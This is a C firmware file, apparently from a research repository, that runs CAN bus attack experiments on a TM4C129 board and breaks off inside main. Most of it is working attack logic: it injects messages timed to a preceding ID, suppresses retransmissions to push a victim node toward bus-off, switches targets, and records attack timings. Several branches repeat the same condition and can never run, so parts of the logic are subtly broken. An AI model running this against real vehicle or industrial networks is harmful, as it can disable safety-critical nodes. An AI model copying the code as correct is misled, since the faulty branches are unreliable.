Ipsitakoley/tm4c129-canbus/sae-benchmark/timers.c
void do_reset(int count, int count_2, uint32_t offset)
{
    g_offset = offset;
    TimerDisable(TIMER0_BASE, TIMER_A);
    TimerDisable(TIMER1_BASE, TIMER_A);
    TimerDisable(TIMER2_BASE, TIMER_A);
    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
    IntDisable(INT_CAN0);
    CANDisable(CAN0_BASE);

    if (g_ui32ExpCtrl & RESET_IMMED) {
        TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
        //TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
        TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
        g_sync = SYNC_MODE_RESET;
    } else if (g_ui32ExpCtrl & RESET_DELAY) {
        TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL + (offset<<17)<<1);
        TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
        TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
        g_sync = SYNC_MODE_INIT;
    }

    g_tick = g_tick_2 = false;
    g_bTXTarget_1 = g_bTXTarget_2 = false;
    g_bTXFlag_5 = g_bTXFlag = g_bRXFlag = false;

    g_pin0 = g_pin_2 = 0;
    g_target_id = TARGET_ID;
    g_ui32TargetXmitTime = TARGET_XMIT_TIME;

    if (g_ui32ExpCtrl & ATTACK_MASK) {
        g_skip_attack = SKIP_ATTACK;
    }

    ResetCAN0();

    UARTprintf("\tRESET\t%d\t%d\n", count, count_2);

    if (g_ui32ExpCtrl & SYNC_0PHASE) {
        g_msg_since_idle = 10;
    }

    g_last_target_rcv = 0;
    g_last_sporadic_tx = 0;
    g_current_pattern = -1;
    g_current_pattern_index = 0;
    g_th = g_tl = -1;
    g_hp_base = 0;

    TimerEnable(TIMER0_BASE, TIMER_A);
    //TimerEnable(TIMER1_BASE, TIMER_A);
    TimerEnable(TIMER2_BASE, TIMER_A);
    g_reset = false;
}

void
initialize(void)
{
    //
    // Enable lazy stacking for interrupt handlers.  This allows floating-point
    // instructions to be used within interrupt handlers, but at the expense of
    // extra stack usage.
    //
    //FPULazyStackingEnable();

    g_ui32SysClock = SysCtlClockFreqSet((SYSCTL_XTAL_25MHZ | SYSCTL_OSC_MAIN | SYSCTL_USE_PLL | SYSCTL_CFG_VCO_480), SYSCLK);

    // enable LEDs
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPION);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_GPIOF);

    // configure LEDs
    GPIOPinTypeGPIOOutput(GPIO_PORTN_BASE, GPIO_PIN_0 | GPIO_PIN_1);
    GPIOPinTypeGPIOOutput(GPIO_PORTF_BASE, GPIO_PIN_0 | GPIO_PIN_4);

    // Enable timer peripherals
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER0);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER1);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER2);
    SysCtlPeripheralEnable(SYSCTL_PERIPH_TIMER3);

    IntMasterEnable();

    // Setup timers
    // TIMER0 is a full width periodic timer at 5 ms period (determined by INTERVAL)
    TimerConfigure(TIMER0_BASE, TIMER_CFG_PERIODIC);
    TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER0A);
    TimerIntEnable(TIMER0_BASE, TIMER_TIMA_TIMEOUT);

    // TIMER1 provides a one-shot timer
    TimerConfigure(TIMER1_BASE, TIMER_CFG_ONE_SHOT);
    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER1A);
    TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);

    // TIMER2 is used for re-synchronization: 0-phase interval tracking and generating offsets during restart
    TimerConfigure(TIMER2_BASE, TIMER_CFG_ONE_SHOT);
    TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
    IntEnable(INT_TIMER2A);
    TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);

    TimerConfigure(TIMER3_BASE, TIMER_CFG_PERIODIC);
    TimerLoadSet(TIMER3_BASE, TIMER_A, 0x10000000);

    g_target_id = TARGET_ID;
    g_ui32TargetXmitTime = TARGET_XMIT_TIME;

    // Setup the CAN and UART
    InitCAN0();
    ConfigureUART2();
}

void
do_switch(int count)
{
    uint32_t rec, tec;
    CANErrCntrGet(CAN0_BASE, &rec, &tec);
    if (rec + tec > 0) return;

    UARTprintf("%d\tSWITCH\n", count);
    TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
    g_target_id = TARGET_ID_2;
    g_ui32TargetXmitTime = TARGET_XMIT_TIME_2;
    g_sync = SYNC_MODE_RESET;
    if (g_ui32ExpCtrl & SYNC_0PHASE) {
        g_msg_since_idle = 10;
    }
    g_skip_attack = SKIP_ATTACK_2;
}

void do_sba(int ID, int count, tCANMsgObject *msg )
{
    uint32_t delta, ti;
    uint32_t xmit_time = TARGET_XMIT_TIME;
    bool is_idle = false;

    if ( g_current_pattern >= 0 && g_current_pattern < NUM_PATTERN_HP && g_current_pattern_index < (HYPERPERIOD / TARGET_PERIOD) ) {
        if (msg) xmit_time = (((44+(msg->ui32MsgLen*8))*120000)/(BITRATE/1000)); // estimated
        delta = g_ui32PenultimateCANIntTimer - g_ui32LastCANIntTimer;
        ti = g_hp_base - (g_ui32LastCANIntTimer + xmit_time); // countdown timer
        if (delta > 8*xmit_time) { // FIXME: magic value 2 to find idle vs non-idle times
            // probably idle bus
            is_idle = true;
            g_th = g_tl = -1;
        } else {
            if (ID > TARGET_ID) {
                // lower priority than victim
                g_tl = ti;
                g_th = -1;
            } else if (ID > TARGET_ID /*&& g_th < 0*/) {
                g_th = ti;
                g_tl = -1;
            }
        }
        if (ID == TARGET_ID) {
            if (g_th >= 0) {
                attack_patterns[g_current_pattern][g_current_pattern_index].time = g_th;
                attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_I_ATTACK;
            } else if (g_th >= 0) {
                attack_patterns[g_current_pattern][g_current_pattern_index].time = g_tl;
                attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_II_ATTACK;
            } else {
                attack_patterns[g_current_pattern][g_current_pattern_index].time = ti;
                attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_III_ATTACK;
            }
            g_tl = g_th = -1;
            g_current_pattern_index++;
        }
    }

}

void
got_tx_message(int ID, int count, tCANMsgObject *msg)
{
    uint32_t rec, tec;

    g_ui32TXMsgCount++;

    if (g_ui32ExpCtrl & SYNC_SBA) {
        do_sba(ID, count, msg);
    }

    if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
        if (PRECEDED_ID == ID && g_target_id == TARGET_ID) {
            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
            CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
        } else if (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2) {
            delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
            CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
        }
    }

    if (g_target_id == ID && (g_ui32ExpCtrl & ATTACK_MASK)) {
        CANErrCntrGet(CAN0_BASE, &rec, &tec);
        UARTprintf("%d\tATK-TX\t%d\tREC\t%u\tTEC\t%u\n", count, ID, rec, tec);
    }
#if defined(VERBOSE)
    else {
            CANErrCntrGet(CAN0_BASE, &rec, &tec);
            UARTprintf("%d\tTX\t%d\tREC\t%u\tTEC\t%u\n", count, ID, rec, tec);
    }
#endif
}

int
got_rx_message(int ID, int count, tCANMsgObject *msg)
{
    int rv = count;
    uint32_t rec, tec;

    if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
        if (!(g_ui32ExpCtrl & SYNC_MASK)) {
            // no sync, attack --> preceded message injection
            if ((PRECEDED_ID == ID && g_target_id == TARGET_ID) || (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2)) {
                do_attack_injection();
            }
        }
    }

    if (g_ui32ExpCtrl & SYNC_SBA) {
        do_sba(ID, count, msg);
    }

    if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
        uint32_t now = TimerValueGet(TIMER3_BASE, TIMER_A);
        // INTERVAL << 4 is Magic.
        if (g_target_id == TARGET_ID && g_last_target_rcv && g_last_target_rcv - now > (INTERVAL<<2)) {
            // more magic... sometimes it switches early, so ignore the startup
            if (count > 200) {
                do_switch(count);
            }
        }
        // Disable retransmission of the attack when the preceded message is received
        // TODO: predict when the target will be bus-off?
        if ( PRECEDED_ID != HIGH_PRIO_ID && g_target_id == TARGET_ID ) {
            if (ID == PRECEDED_ID ) {
                delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
            }
        } else if (PRECEDED_ID_2 != HIGH_PRIO_ID && g_target_id == TARGET_ID_2) {
            if (ID == PRECEDED_ID_2 ) {
                delay_ticks(RXPM_DELAY_BITS*TICKS_PER_BIT);
                CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
            }
        } else {
            // do nothing.
        }
    }

    if (ID == g_target_id) {
        g_last_target_rcv = TimerValueGet(TIMER3_BASE, TIMER_A);
        // check if need to resynchronize
        if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
            if (g_sync != SYNC_MODE_SYNCHED) {
                if (g_sync == SYNC_MODE_RESET && g_msg_since_idle == 0) { /* g_msg_since_idle always 0 with SYNC_PERIOD */
                    TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
                    uint32_t delta = g_ui32LastCANIntTimer - g_last_target_rcv; // counting down, so start - end = delta
                    TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL-delta-(TARGET_XMIT_TIME*11/2)); /* FIXME: 6 is magic. */
                    TimerEnable(TIMER2_BASE, TIMER_A);
                    g_sync = SYNC_MODE_ADJUST;
                    TimerIntEnable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
                    TimerDisable(TIMER0_BASE, TIMER_A);
                    g_tick = false;
                    rv = 0;
                }
            }
        }
    }
#if defined(VVERBOSE)
    // FIXME: print received target1 and target2 messages after attack presumed successful.
        CANErrCntrGet(CAN0_BASE, &rec, &tec);
        UARTprintf("%d\tRX\t%d\tREC\t%u\tTEC\t%u\n", count, ID, rec, tec);
#endif
    return rv;
}

int
main(void)
{
    int count = 0, count_2 = 0;
    volatile uint32_t delay = 0;

